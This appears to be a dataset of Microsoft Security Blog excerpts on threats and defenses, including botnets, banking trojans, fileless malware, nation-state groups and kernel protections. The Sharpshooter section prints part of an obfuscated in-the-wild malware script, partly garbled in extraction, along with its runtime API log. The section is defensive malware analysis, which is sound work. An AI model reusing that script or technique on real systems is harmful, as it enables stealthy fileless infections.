target, good credential hygiene, network segmentation, and similar best practices increase the \"cost\" to attackers trying to propagate through the network. These best practices can limit an attacker's ability to move laterally and compromise assets after initial intrusion and should be complemented with advanced security solutions that provide visibility across domains and coordinate threat data across protection components. \nOrganizations can further reduce their attack surface by disabling the use of basic authentication, enabling multi-factor authentication for all users, and requiring multi-factor authentication when joining devices to Azure AD. Microsoft 365 global admins can also disable Exchange Online PowerShell for individual or multiple end users via a list of specific users or filterable attributes, assuming that the target accounts all share a unique filterable attribute such as Title or Department. For additional security, customers can enforce our new Conditional Access control requiring MFA to register devices, which can be combined with other CA conditions like device platform or trusted networks. \nMicrosoft 365 Defender correlates the alerts and signals related to initial phishing generated by suspicious inbox rule creation as well as suspicious device registration into a single easy to comprehend Incident. \nMicrosoft Defender for Office 365 protects against email threats using its multilayered email filtering stack, which includes edge protection, sender intelligence, content filtering, and post-delivery protection, in addition to including outbound spam filter policies to configure and control automatic email forwarding to external recipients. Moreover, Microsoft Defender for Office 365 uses Safe Links feature to proactively protect users from malicious URLs in internal messages or in an Office document at time of click. Safe Links feature to proactively protect users from malicious URLs in internal messages or in an Office document at time of click. ", "source": "microsoft"}, {"title": "Introduction", "content": "Firmware, which lives below the operating system, is emerging as a primary target because it is where sensitive information like credentials and encryption keys are stored in memory. Many devices in the market today don't offer visibility into that layer to ensure that attackers haven't compromised a device prior to the boot process or at runtime bellow the kernel. And attackers have noticed. \nIf that's not enough, the National Institute of Standards and Technology's (NIST) National Vulnerability Database (NVD) has shown more than a five-fold increase in attacks against firmware in the last four years, and attackers have used this time to further refine their techniques and get ahead of software-only protections. \nYet the Security Signals study shows that awareness of this threat is lagging across industries. Even with this onslaught of firmware attacks, the study shows that SDMs believe software is three times as likely to pose a security threat versus firmware. \n\"There are two types of companies \u2013 those who have experienced a firmware attack, and those who have experienced a firmware attack but don't know it.\" - Azim Shafqat, Partner at ISG and Former Managing VP at Gartner ", "source": "microsoft"}, {"title": "Defense", "content": "A look at respondents' investments bears out this disparity. Hardware-based security features such as Kernel data protection (KDP), or memory encryption, which blocks malware or malicious threat actors from corrupting the operating system's kernel memory or from reading it at runtime, is a leading indicator of preparedness against sophisticated kernel-level attacks. Security Signals found that only $36\\%$ of businesses invest in hardware-based memory encryption and less than half $(46\\%)$ are investing in hardware-based kernel protections. \nSecurity Signals also found that security teams are too focused on outdated \"protect and detect\" models of security and are not spending enough time on strategic work - only $39\\%$ of security teams' time is spent on prevention and they don't see that changing in the next two years. The lack of proactive defense investment in kernel attack vectors is an example of this outdated model. ", "source": "microsoft"}, {"title": "Introduction", "content": "Phorpiex's sprawling botnet operation can be divided into three main portions: \n1. Distribution of the bot loader: The bot loader has been propagated through a variety of means over the years, including being loaded by other malware, freeware, and unwanted programs, or delivered by phishing emails from already-infected bots. Phorpiex has also spread via productivity platforms, as well as via instant messaging and USB drives.   \n2. Mailing botnet: In addition to spreading the bot loader via email, the botnet is used to generate currency. It does so via extortion and spam campaigns as well as through a variety of other types of financially motivated malware.   \n3. Malware delivery botnet: In recent years, the botnet has been observed installing ransomware, cryptocurrency miner, and other malware types, indicating the expansion of the botnet's activities by the Phorpiex operators or as part of malware-as-a-service scheme. \nPhorpiex morphs: How a longstanding botnet persists and thrives in the current threat environment | Microsoft Security Blog From December 2020 to February 2021, the Phorpiex bot loader was encountered in 160 countries, with Mexico, Kazakhstan, and Uzbekistan registering the most encounters. \nIn December 2020 and January 2021, we observed non-weaponized staging of Knot ransomware on Phorpiex servers. In February, we also detected commodity malware such as Mondfoxia (also known as DiamondFox) in these servers. These recent developments indicate new loader and monetization strategies under active development. \nThe combination of the wide variety of infection vectors and outcomes makes the Phorpiex botnet appear chaotic at first glance. However, for many years Phorpiex has maintained a consistent internal infrastructure using similar domains, command-and-control (C2) mechanisms, and source code. \nThe wide range of infection vectors used by Phorpiex requires a unified security approach that ensures protection is delivered on the endpoint, network, email, and applications. Microsoft 365 Defender's advanced threat protection technologies detect malicious activity in each of these domains. Moreover, the correlation of these cross-domain threat data surfaces additional malicious activity, allowing Microsoft 365 Defender to provide coordinated and comprehensive protection against Phorpiex. ", "source": "microsoft"}, {"title": "defend", "content": "Botnets drive a huge portion of the malware economy, and as the resilience of Phorpiex shows, they evolve to adapt to the ever-changing threat environment. Our many years of experience analyzing, monitoring, and even working with law enforcement and other partners to take down botnets tell us that alternative infrastructures rise as attackers try to fill in the void left by disrupted botnets. Typically, new infrastructures are born as a result of these movements, but in the case of Phorpiex, an established botnet adapts and takes over. \nThe wide range of malicious activities associated with botnets, as we detailed in this in-depth research into Phorpiex, represent the spectrum of threats that organizations face today: various attack vectors,  multiple spreading mechanisms, and a diverse set of payloads that attackers can change at will. To combat these threats, organizations need security solutions that deliver cross-domain visibility and coordinated defense. \nMicrosoft 365 Defender leverages the capabilities and signals from the Microsoft 365 security portfolio to correlate threat data from endpoints, email and data, identities, and cloud apps to provide comprehensive protection against threats. Microsoft Defender for Endpoint detects and blocks malware, other malicious artifacts, and malicious behavior associated with botnet activity, as well as the deployment of secondary payloads like cryptocurrency miners and ransomware. Features like attack surface reduction, tamper protection, and security controls for removable media further help prevent these attacks and harden networks against threats in general. Microsoft Defender for Office 365 detects the malicious attachments and URLs in emails generated by the mailing operations of the Phorpiex botnet. \nOur industry-leading visibility informs AI and machine learning technologies that power the automatic prevention, detection, and remediation of threats, as well as the rich set of investigation tools available to defenders for hunting, analyzing, and resolving attacks. The recently generally available unified Microsoft 365 Defender security center integrates capabilities so defenders can manage all endpoint, email, and cross-product investigations, configuration, and remediation with a single portal. \nOur understanding of how botnets operate and evolve, through in-depth research like this, further enriches our ability to continue delivering defenses against the threats of today and the future. Learn how Microsoft 365 Defender stops attacks with automated, cross-domain security and built-in AI. ", "source": "microsoft"}, {"title": "Introduction", "content": "We discovered a recent WhatsApp phishing campaign through our telemetry that led to banking trojan activity. In this campaign, the attacker shares a malicious APK file through WhatsApp with a message asking users to enter sensitive information in the app. The widely circulated fake banking message states \"Your [redacted] BANK Account will be Blocked Today please update your PANCARD immediately open [redacted]-Bank.apk for update your PANCARD. Thank You.\" and includes a APK file named [redacted]-BANK[.]apk. \nUpon investigation, we discovered that the APK file was malicious and interacting with it installs a fraudulent application on the victim device. The installed app impersonates a legitimate bank located in India and disguises itself as the bank's official Know Your Customer (KYC) application to trick users into submitting their sensitive information, despite this particular banking organization not being affiliated with an official KYC-related app. This information is then sent to a command and control (C2) server, as well as to the attacker's hard-coded phone number used in SMS functionality. ", "source": "microsoft"}, {"title": "Conclusion", "content": "Mobile banking trojan infections can pose significant risks to users' personal information, privacy, device integrity, and financial security. As the campaigns discussed in this blog display, these threats can often disguise themselves as legitimate apps and deploy social engineering tactics to achieve their goals and steal users' sensitive data and financial assets. Being aware of the risks and common tactics used by banking trojans and other mobile malware can help users identify signs of infection and take appropriate action to mitigate the impacts of these threats. \nFinding unfamiliar installed apps, increased data usage or battery drain, unauthorized transactions or account settings changes, device crashes, slow performance, unexpected pop-ups, and other unusual app behaviors can indicate a possible banking trojan infection. To help prevent such threats, we recommend the following precautionary measures: \nOnly install apps from trusted sources and official stores, like the Google Play Store and Apple App Store.   \nNever click on unknown links received through ads, SMS messages, emails, or similar untrusted sources.   \nUse mobile solutions such as Microsoft Defender for Endpoint on Android to detect malicious applications   \nAlways keep Install unknown apps disabled on the Android device to prevent apps from being installed from unknown sources. \nAdditionally, various Indian banks, governments services, and other organizations are conducting security awareness campaigns on social media using promotional videos to educate users and help combat the ongoing threat presented by these mobile banking trojan campaigns. \nAbhishek Pustakala, Harshita Tripathi, and Shivang Desai \nMicrosoft Threat Intelligence ", "source": "microsoft"}, {"title": "Introduction", "content": "The two aforementioned obfuscated scripts are actual malware detected and blocked in the wild by antivirus capabilities in Windows Defender ATP. Removing the first layer of obfuscation reveals a code that, while still partially obfuscated, showed some functions related to a fileless malware technique called Sharpshooter. We found the two scripts, which were variants of the same malware, not long after the Sharpshooter technique was documented and published by MDSec in 2017. \nThe Sharpshooter technique allows an attacker to use a script to execute a .NET binary directly from memory without ever needing to reside on the disk. This technique provides a framework that can enable attackers to easily repackage the same binary payload within a script. As demonstrated by the example of the two scripts, files that use the Sharpshooter technique can then be used in social engineering attacks to lure users into running the script to deliver a fileless payload. \neval(function(p,a,c,k,e,d){e=function(c){return(c<a?':e(parseInt(c/a))) $^{1+}$ (( $c=c^{10}$ a)>35?string.fromCharc (!''.replace( $1\\times1$ ,String))(while $(c=-3$ {d[e(c)]=k[c]lle(c) $k=$ [function(e){return d[e]}]; $\\in=$ function(){ret $f_{p}=p$ .replace(new RegExp) $\\because\\backslash\\backslash{\\sf b}^{\\prime}+\\in\\left(\\mathtt{c}\\right)+^{\\prime}\\backslash\\backslash{\\sf b}^{\\prime},^{\\prime}\\mathbf{g}^{\\prime}),|\\epsilon[\\mathtt{c}])\\}\\}|$ return p}('12 1j=4nS;1c ts(1f)(12 f=\\'\\';4nR(i=0 1c 1DW(){12 $\\scriptstyle1_{\\mathrm{E}}=13$ 14(ts([87,83,99,114,105,112,116,46,83,104,101,108,108]));1i=ts([118,52,46,48,46,51, ([72,75,76,77,92,83,79,70,84,87,65,82,69,92,77,105,99,114,111,115,111,102,116,92,46,78,69,84,70,114,9 8,46,51,48,51,49,57,921))}1d(e) $[1]=4n V$ ;1i=ts([118,50,46,48,46,53,48,55,50,55])}1g.4n0(ts([80,114,111, ([67,79,77,80,76,85,83,95,86,101,114,115,105,111,110]))=1i}1c 1e(s){31T.4n1(s)}1c 315(b){12 e=13 14(t ([83,121,115,116,101,109,46,84,101,120,116,46,65,83,67,73,73,69,110,99,111,100,105,110,103]));12 1=e. ([83,121,115,116,101,109,46,83,101,99,117,114,105,116,121,46,67,114,121,112,116,111,103,114,97,112,1 ,52,84,114,97,110,115,102,111,114,109]));b=t.4nK(b,0,1);12 m=13 14(ts   \n([83,121,115,116,101,109,46,73,79,46,77,101,109,111,114,121,83,116,114,101,97,109]));m.4nN(b,0,(1/4)\\* (e.10G)}if(1j){12   \nSO=\"1DU/////1DT\"+\"1DR\"+\"1DS\"+\"1DX\"+\"1DY\"+\"1E3\"+\"1E4\"+\"1E2\"+\"1E1\"+\"1DZ\"+\"1E0\"+\"1DQ\"+\"1DP\"+\"1DE\"+\"1DF\"+ //1D0\"+\"1DM+1DL\"+\"4nX\"+\"4nY\"+\"40a\"+\"4o9\"+\"1DJ\"+\"4o8\"+\"1DK\"+\"4ob\"+\"1E5\"+\"1E6\"+\"1Es\"+\"1Et+1Er+1Eq+1Eo\"+ +1Eu\"+\"1Ev\"+\"1EA\"+\"1EB\"+\"1Ez\"+\"1Ey\"+\"1Ew+1Ex\"+\"1En/1Em\"+\"1Ec\"+\"1Ed\"+\"1Ea\"+\"1E9/1E7\"+\"1E8\"+\"1Ee +1Ef\"+\"1Ek\"+\"1E1\"+\"1Ej/1Ei\"+\"1Eg\"+\"1Eh/1Dz\"+\"1Dy\"+\"1CS\"+\"1CT\"+\"1CR\"+\"1CQ\"+\"1CO\"+\"1CP\"+\"1CU\"+\"1CV\"+\"1D 1CM\"+\"1CC   \n+1CD\"+\"1CB\"+\"1CA\"+\"1Cx\"+\"1Cy\"+\"1Cz\"+\"1CE\"+\"1CF\"+\"1CK\"+\"1CL\"+\"1C)\"+\"1CI\"+\"1CG///1CH\"+\"1D2\"+\"1D3\"+\"1D\" Dr\"+\"1Dw\"+\"1Dx\"+\"1Dv\"+\"1Du\"+\"1Ds\"+\"1Dt\"+\"1Dj\"+\"1Di \nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQ0AAAAE\"+\"AAAACRcAAAAJBgAAAAkWAAAABhoAAAAnU3lzdGVtL1J1Zmx1Y3Rpb24uQXNz7 et=ts([84,101,115,116,67,108,97,115,115]);try{var s=bt64(s0);var f=new ActiveX0bject(ts ([83,121,115,116,101,109,46,82,117,110,116,105,109,101,46,83,101,114,105,97,108,105,122,97,116,105,1 14,115,46,66,105,110,97,114,121,46,66,105,110,97,114,121,70,111,114,109,97,116,116,101,114]));var a= ([83,121,115,116,101,109,46,67,111,108,108,101,99,116,105,111,110,115,46,65,114,114,97,121,76,105,11 d=f.Deserialize_2(s);a.Add(n);var o=d.DynamicInvoke(a.ToArray()).CreateInstance(et);o.executeApp(WSc (e.message)) \nWhen the Sharpshooter technique became public, we knew it was only a matter time before it would be used it in attacks. To protect customers from such attacks, we implemented a detection algorithm based on runtime activity rather than on the static script. In other words, the detection is effective against the Sharpshooter technique itself, thus against new and unknown threats that implement the technique. This is how Windows Defender ATP blocked the two malicious scripts at first sight, preventing the fileless payload from being loaded. \nThe detection algorithm leverages AMSI support in scripting engines and targets a generic malicious behavior (a fingerprint of the malicious fileless technique). Script engines have the capability to log the APIs called by a script at runtime. This API \nOut of sight but not invisible: Defeating fileless malware with behavior monitoring, AMSI, and next-gen AV | Microsoft Security Blog logging is dynamic and is therefore not hindered by obfuscation: a script can hide its code, but it cannot hide its behavior. The log can then be scanned by antivirus solutions via AMSI when certain dangerous APIs (i.e., triggers) are invoked. \nThis is the dynamic log generated by the scripts and detected by Windows Defender ATP at runtime via AMSI: \nIWshShel13.RegRead(\"HKLM\\S0FTWARE\\Microsoft\\.NETFramework\\v4.0.30319\\\");   \nIWshshell3.Environment(\"Process\");   \nIWshEnvironment.Item(\"coMPLUS_Version\", \"v4.0.30319\");   \n_ASCIIEncoding._6002000f(\"AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZWOuRGVsZWdhdGVTZXJ _ASCIIEncoding-_60020014(\"AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZWOuRGVsZWdhdGVTZXJ;   \n_FromBase64Transform._60020009(\"Unsupported parameter type 00002011\", \"0\", \"41269t MemoryStream._60020017(\"Unsupported parameter type 00002011\", \"0\", \"309522\");   \n_MemoryStream._6002000b(\"0\");   \nBinaryFormatter._60020008();   \n_BinaryFormatter._60020006(\"Unsupported parameter type 00000009\");   \n_ArrayList._60020020(\"Unsupported parameter type 00000009\");   \n_ArrayList._6002001b();   \n_HeaderHandler._60020007(\"Unsupported parameter type 0000200c\"); \nUsing this AMSI-aided detection, Windows Defender ATP disrupted two distinct malware campaigns in June, as well as the steady hum of daily activities. \nFurthermore, generically detecting the Sharpshooter technique allowed us to discover a particularly sophisticated and interesting attack. Windows Defender ATP's endpoint and detection response capabilities caught a VBScript file that used the Sharpshooter technique. \nWe analyzed the script and extracted the fileless payload, a very stealthy .NET executable. The malware payload downloads data from its command-and-control (C&C) server via the TXT records of DNS queries. In particular, it downloads the \nOut of sight but not invisible: Defeating fileless malware with behavior monitoring, AMSI, and next-gen AV | Microsoft Security Blog initialization vector and decryption key necessary to decode the core of the malware. The said core is also fileless because it's executed directly in memory without being written on the disk. Thus, this attack leveraged two fileless stages. \nOur investigation into the incident turned up enough indicators for us to conclude that this was likely a penetration testing exercise or a test involving running actual malware, and not a real targeted attack. \nNonetheless, the use of fileless techniques and the covert network communication hidden in DNS queries make this malware similar in nature to sophisticated, realworld attacks. It also proved the effectiveness of the dynamic protection capabilities of Windows Defender ATP. In a previous blog post, we documented how such capabilities allow Windows Defender ATP to catch KRYPTON attacks and other high-profile malware. ", "source": "microsoft"}, {"title": "Protection", "content": "File-based inspection is ineffective against fileless malware. Antivirus capabilities in Windows Defender ATP use defensive layers based on dynamic behavior and integrate with other Windows technologies to detect and terminate threat activity at runtime. \nWindows Defender ATP's next-gen dynamic defenses have become of paramount importance in protecting customers from the increasingly sophisticated attacks that fileless malware exemplifies. In a previous blog post we described some of the offensive and defensive technologies related to fileless attacks and how these solutions help protect our customers. Evolving from the file-centric scanning model, Windows Defender ATP uses a generic and more powerful behavior-centric detection model to neutralize generic malicious behaviors and thus take out entire classes of attack. ", "source": "microsoft"}, {"title": "Protection", "content": "With Controlled folder access on Windows 10, Windows Defender ATP does not allow write operations to the boot sector, thus closing a dangerous fileless attack vector used by Petya, BadRabbit, and bootkits in general. Boot infection techniques can be suitable for fileless threats because they can allow malware to reside outside of the file system and gain control of the machine before the operating system is loaded. The use of rootkit techniques, like in the defunct Alureon malware (also known as TDSS or TDL-4), can then render the malware invisible and extremely difficult to detect and remove. With Controlled folder access, which is part of Windows Defender ATP's attack surface reduction capabilities, this entire class of infection technique has become a thing of the past. ", "source": "microsoft"}, {"title": "Conclusion", "content": "As antivirus solutions become better and better at pinpointing malicious files, the natural evolution of malware is to shift to attack chains that use as few files as possible. While fileless techniques used to be employed almost exclusively in sophisticated cyberattacks, they are now becoming widespread in common malware, too. \nAt Microsoft, we actively monitor the security landscape to identify new threat trends and develop solutions that continuously enhance Windows security and mitigate classes of threats. We instrument durable generic detections that are effective against a wide range of threats. Through AMSI, behavior monitoring, memory scanning, and boot sector protection, we can inspect threats even with heavy obfuscation. Machine learning technologies in the cloud allow us to scale these protections against new and emerging threats. \nSecurity solutions on Windows 10 integrate into a unified endpoint security platform in Windows Defender Advanced Threat Protection. Windows Defender ATP includes attack surface reduction, next-generation protection, endpoint protection and response, auto investigation and remediation, security posture, and advanced hunting capabilities. To test how Windows Defender ATP can help your organization detect, investigate, and respond to advanced attacks, sign up for a free trial. \nProtections against fileless and other threats are shared across Microsoft 365, which integrate technologies in Windows, Office 365, and Azure. Through the Microsoft Intelligent Security Graph, security signals are shared and remediation is orchestrated across Microsoft 365. \nAndrea Lelli Windows Defender Research ", "source": "microsoft"}, {"title": "Introduction", "content": "Reinforcement learning is a type of machine learning with which autonomous agents learn how to conduct decision-making by interacting with their environment. Agents may execute actions to interact with their environment, and their goal is to optimize some notion of reward. One popular and successful application is found in video games where an environment is readily available: the computer program implementing the game. The player of the game is the agent, the commands it takes are the actions, and the ultimate reward is winning the game. The best reinforcement learning algorithms can learn effective strategies through repeated experience by gradually learning what actions to take in each state of the environment. The more the agents play the game, the smarter they get at it. Recent advances in the field of reinforcement learning have shown we can successfully train autonomous agents that exceed human levels at playing video games. \nLast year, we started exploring applications of reinforcement learning to software security. To do this, we thought of software security problems in the context of reinforcement learning: an attacker or a defender can be viewed as agents evolving in an environment that is provided by the computer network. Their actions are the available network and computer commands. The attacker's goal is usually to steal confidential information from the network. The defender's goal is to evict the attackers or mitigate their actions on the system by executing other kinds of operations. \nIn this project, we used OpenAI Gym, a popular toolkit that provides interactive environments for reinforcement learning researchers to develop, train, and evaluate new algorithms for training autonomous agents. Notable examples of environments built using this toolkit include video games, robotics simulators, and control systems. \nComputer and network systems, of course, are significantly more complex than video games. While a video game typically has a handful of permitted actions at a time, there is a vast array of actions available when interacting with a computer and network system. For instance, the state of the network system can be gigantic and not readily and reliably retrievable, as opposed to the finite list of positions on a board game. Even with these challenges, however, OpenAI Gym provided a good framework for our research, leading to the development of CyberBattleSim. ", "source": "microsoft"}, {"title": "Introduction", "content": "By Microsoft Threat Intelligence \nnovel or unique AI-enabled attack or abuse techniques resulting from threat actors' usage of AI. However, Microsoft and our partners continue to study this landscape closely. \nThe objective of Microsoft's partnership with OpenAI, including the release of this research, is to ensure the safe and responsible use of AI technologies like ChatGPT, upholding the highest standards of ethical application to protect the community from potential misuse. As part of this commitment, we have taken measures to disrupt assets and accounts associated with threat actors, improve the protection of OpenAI LLM technology and users from attack or abuse, and shape the guardrails and safety mechanisms around our models. In addition, we are also deeply committed to using generative AI to disrupt threat actors and leverage the power of new tools, including Microsoft Copilot for Security, to elevate defenders everywhere. ", "source": "microsoft"}, {"title": "Defense", "content": "Because Microsoft and OpenAI's partnership extends to security, the companies can take action when known and emerging threat actors surface. Microsoft Threat Intelligence tracks more than 300 unique threat actors, including 160 nation-state actors, 50 ransomware groups, and many others. These adversaries employ various digital identities and attack infrastructures. Microsoft's experts and automated systems continually analyze and correlate these attributes, uncovering attackers' efforts to evade detection or expand their capabilities by leveraging new technologies. Consistent with preventing threat actors' actions across our technologies and working closely with partners, Microsoft continues to study threat actors' use of AI and LLMs, partner with OpenAI to monitor attack activity, and apply what we learn to continually improve defenses. This blog provides an overview of observed activities collected from known threat actor infrastructure as identified by Microsoft Threat Intelligence, then shared with OpenAI to identify potential malicious use or abuse of their platform and protect our mutual customers from future threats or harm. \nRecognizing the rapid growth of AI and emergent use of LLMs in cyber operations, we continue to work with MITRE to integrate these LLM-themed tactics, techniques, and procedures (TTPs) into the MITRE ATT&CK\u00ae framework or MITRE ATLAS\u2122 (Adversarial Threat Landscape for Artificial-Intelligence Systems) knowledgebase. This strategic expansion reflects a commitment to not only track and neutralize threats, but also to pioneer the development of countermeasures in the evolving landscape of AI-powered cyber operations. A full list of the LLM-themed TTPs, which include those we identified during our investigations, is summarized in the appendix. ", "source": "microsoft"}, {"title": "Summary", "content": "The threat ecosystem over the last several years has revealed a consistent theme of threat actors following trends in technology in parallel with their defender counterparts. Threat actors, like defenders, are looking at AI, including LLMs, to enhance their productivity and take advantage of accessible platforms that could advance their objectives and attack techniques. Cybercrime groups, nation-state threat actors, and other adversaries are exploring and testing different AI technologies as they emerge, in an attempt to understand potential value to their operations and the security controls they may need to circumvent. On the defender side, hardening these same security controls from attacks and implementing equally sophisticated monitoring that anticipates and blocks malicious activity is vital. \nWhile different threat actors' motives and complexity vary, they have common tasks to perform in the course of targeting and attacks. These include reconnaissance, such as learning about potential victims' industries, locations, and relationships; help with coding, including improving things like software scripts and malware development; and assistance with learning and using native languages. Language support is a natural feature of LLMs and is attractive for threat actors with continuous focus on social engineering and other techniques relying on false, deceptive communications tailored to their targets' jobs, professional networks, and other relationships. \nImportantly, our research with OpenAI has not identified significant attacks employing the LLMs we monitor closely. At the same time, we feel this is important research to publish to expose early-stage, incremental moves that we observe wellknown threat actors attempting, and share information on how we are blocking and countering them with the defender community. \nWhile attackers will remain interested in AI and probe technologies' current capabilities and security controls, it's important to keep these risks in context. As always, hygiene practices such as multifactor authentication (MFA) and Zero Trust defenses are essential because attackers may use AI-based tools to improve their existing cyberattacks that rely on social engineering and finding unsecured devices and accounts. \nThe threat actors profiled below are a sample of observed activity we believe best represents the TTPs the industry will need to better track using MITRE ATT&CK\u00ae framework or MITRE ATLAS\u2122 knowledgebase updates. ", "source": "microsoft"}, {"title": "Introduction", "content": "In VBS environments, the normal NT kernel runs in a virtualized environment called VTL0, while the secure kernel runs in a more secure and isolated environment called VTL1. More details on VBS and the secure kernel are available on Channel 9 here and here. KDP is intended to protect drivers and software running in the Windows kernel (i.e., the OS code itself) against data-driven attacks. It is implemented in two parts: \nStatic KDP enables software running in kernel mode to statically protect a section of its own image from being tampered with from any other entity in VTL0. Dynamic KDP helps kernel-mode software to allocate and release read-only memory from a \"secure pool\". The memory returned from the pool can be initialized only once. \nThe memory managed by KDP is always verified by the secure kernel (VTL1) and protected using second level address translation (SLAT) tables by the hypervisor. As a result, no software running in the NT kernel (VTL0) will ever be able to modify the content of the protected memory. \nBoth dynamic and static KDP, which are already available in the latest Windows 10 Insider Build and work with any kind of memory, except for executable pages. Protection for executable pages is already provided by hypervisor-protected code integrity (HVCI), which prevents any non-signed memory from being ever executable, granting the $\\mathsf{W}^{\\wedge}\\mathsf{X}$ (a page that is either writable or executable, but never both) condition. HVCI and the W^X conditions are not explained in this article (refer to the new upcoming Windows Internals book for further details). ", "source": "microsoft"}, {"title": "Introduction", "content": "Digital signatures are an important way to ensure the integrity of software. By verifying the identity of the software publisher, a signature assures customers that they know who provided the software they're installing or running. Digital signatures also assure customers that the software they received is in the same condition as when the publisher signed it and the software has not been tampered with. \nCode signing does not necessarily guarantee the quality or functionality of software. Digitally signed software can still contain flaws or security vulnerabilities. However, because software vendors' reputations are based on the quality of their code, there is an incentive to fix these issues. \nWe use the reputation of digital certificates to help determine the reputation of files signed by them. The reverse is also true: we use the reputation of digitally signed files to determine the reputation of the digital certificates they are signed with. One of the most effective ways for developers to reduce the chances of their software being detected as malware is it to digitally sign files with a reputable certificate. \nThe second part of reducing the risk of unintended detection is to build a good reputation on that certificate. Microsoft uses many factors to determine the reputation of a certificate, but the most important are the files that are signed by it. If all the files using a certificate have good reputation and the certificate is valid, then the certificate keeps a good reputation. \nExtended validation (EV) code signing is a more advanced version of digital certificates and requires a more rigorous vetting and authentication process. This process requires a more comprehensive identity verification and authentication process for each developer. The EV code signing certificates require the use of hardware to sign applications. This hardware requirement is an additional protection against theft or unintended use of code signing certificates. At the time this post was written, programs signed by an EV code signing certificate could immediately establish reputation with Microsoft Defender SmartScreen even if no prior reputation existed for that file or publisher. Starting in 2020, EV certificates were no longer treated specially, and will now develop reputation the same way as other Authenticode certificates. ", "source": "microsoft"}, {"title": "Introduction", "content": "Peach Sandstorm is an Iranian nation-state group known to target organizations in multiple countries. In past attacks, Peach Sandstorm has pursued targets in the aviation, construction, defense, education, energy, financial services, healthcare, government, satellite, and telecommunications sectors. Activity that Microsoft attributes to Peach Sandstorm overlaps with public reporting on groups known as APT33, Elfin, and Refined Kitten. \nThroughout 2023, Peach Sandstorm has consistently demonstrated interest in organizations in the satellite, defense, and to a lesser extent, pharmaceutical sectors.  In the initial phase of this campaign, Peach Sandstorm conducted password spray campaigns against thousands of organizations across several sectors and geographies. While Microsoft observed several organizations previously targeted by Peach Sandstorm, the volume of activity and range of organizations suggests that at least a subset of the initial activity is opportunistic. \nIn past operations, Peach Sandstorm relied heavily, but not exclusively, on password spray attacks as a means of gaining access to targets of interest. In some cases, Peach Sandstorm has used this tradecraft to compromise an intermediate target and enable access to downstream environments. As one example, Peach Sandstorm carried out a wave of attacks in 2019 that coincided with a rise in tensions between the United States and the Islamic Republic of Iran. \nUnlike password spray operations which are noisy by definition, a subset of Peach Sandstorm's 2023 post-compromise activity has been stealthy and sophisticated. Many of the cloud-based tactics, techniques, and procedures (TTPs) seen in these most recent campaigns are materially more sophisticated than capabilities used by Peach Sandstorm in the past. ", "source": "microsoft"}, {"title": "Introduction", "content": "Light \nBlog home / Threat intelligence All Microsoft\ue70d Products\ue70d \nSearch the blog \nResearch Threat intelligence Vulnerabilities and exploits \n6 min read \nTaking apart a double zero-day sample discovered in joint hunt with ESET \nBy Microsoft Defender Security Research Team \nJuly 2, 2018 ", "source": "microsoft"}, {"title": "Defense", "content": "To protect against attacks leveraging the exploits found in the PDF: \nDeploy relevant updates as soon as possible: CVE-2018-4990 | Security updates available for Adobe Acrobat and Reader | APSB18-09 CVE-2018-8120 | Win32k Elevation of Privilege Vulnerability Disable JavaScript on Adobe Acrobat and Acrobat Reader if it isn't needed in your organization Reinforce end-user awareness about spear-phishing and other social engineering attempts that use PDF attachments \nWhile we have not seen attacks distributing the PDF, Office 365 Advanced Threat Protection (Office 365 ATP) would block emails that carry malformed PDF and other malicious attachments. Office 365 ATP uses a robust detonation platform, heuristics, and machine learning to inspect attachments and links for malicious content in real-time. \nWindows 10 users are not impacted by the dual exploits, thanks to platform hardening and exploit mitigations. For attacks against Windows 10, Windows Defender Advanced Threat Protection (Windows Defender ATP) would surface kernel attacks with similar exploitation techniques that use process token modification to elevate privileges, as shown below (sample process privilege escalation alert). \nWith Advanced hunting in Windows Defender ATP, customers can hunt for related exploit activity using the following query we added to the Github repository: \nWindows Defender ATP provides complete endpoint protection platform (EPP) and endpoint detection response (EDR) solutions for Windows 10, Windows Server 2012, Windows Server 2012 R2, and Windows Server 2016. Additional support for devices running Windows 7 and Windows 8.1 is currently in preview. Additionally, Windows Defender ATP can surface threats on macOS, Linux, and Android devices via security partners. \nWindows Defender ATP integrates with other technologies in Windows, Office 365, and Enterprise Mobility $^+$ Security platforms to automatically update protection and detection and orchestrate remediation across Microsoft 365. ", "source": "microsoft"}, {"title": "Indicators of compromise", "content": "SHA-256:   \ndd4e4492fecb2f3fe2553e2bcedd44d17ba9bfbd6b8182369f615ae0bd520933   \nSHA-1: 297aef049b8c6255f4461affdcfc70e2177a71a9   \nFile type: PE   \nDescription: Win32k exploit   \nSHA-256:   \n4b672deae5c1231ea20ea70b0bf091164ef0b939e2cf4d142d31916a169e8e01   \nSHA-1: 0d3f335ccca4575593054446f5f219eba6cd93fe   \nFile type: PDF   \nDescription: Test exploit   \nSHA-256:   \n0608c0d26bdf38e064ab3a4c5c66ff94e4907ccaf98281a104fd99175cdf54a8   \nSHA-1: c82cfead292eeca601d3cf82c8c5340cb579d1c6   \nFile type: PDF   \nDescription: PDF exploit testing sample (Win32k part missing)   \nSHA-256:   \nd2b7065f7604039d70ec393b4c84751b48902fe33d021886a3a96805cede6475   \nSHA-1: edeb1de93dce5bb84752276074a57937d86f2cf7   \nFile type: JavaScript   \nDescription: JavaScript embedded in   \n0608c0d26bdf38e064ab3a4c5c66ff94e4907ccaf98281a104fd99175cdf54a8 \nMatt Oh Windows Defender ATP Research ", "source": "microsoft"}, {"title": "Introduction", "content": "As previously covered in our Shrootless vulnerability blog post, System Integrity Protection (SIP)-also known as \"rootless\"-was first introduced by Apple in macOS Yosemite. SIP essentially locks down the system from root by leveraging the Apple sandbox to protect the entire platform, conceptually similar to how SELinux protects Linux systems. One of the most dominant features of SIP is the filesystem restriction capability, which protects entire files and directories from being overridden. The files and directories that are protected by SIP by default are commonly ones that are related to the system's integrity. \nThere is no way to turn off SIP on a live system-the user must use the recovery OS, which requires physical access to the device. A SIP bypass is a vulnerability that bypasses SIP restrictions, for example, bypassing restrictions to write to SIPprotected directories or create a SIP-protected file. \nAnother important macOS concept is entitlements. According to documentation, \"an entitlement is a right or privilege that grants an executable particular capabilities\". As entitlements take part in the app signing process, there is no legitimate way of forging them. Apple uses entitlements extensively to enforce security on macOS, and Apple grants internal entitlements to very specific processes. Specifically, certain processes are assigned entitlements that allow the process to bypass System Integrity Protection checks by design. One particularly interesting entitlement is the com.apple.rootless.install.heritable entitlement that allows the process and the entire process tree rooted under it to bypass filesystembased System Integrity Protection security enforcements. ", "source": "microsoft"}, {"title": "Protection", "content": "Attackers continue to seek new footholds into increasingly secure devices and networks, oftentimes by 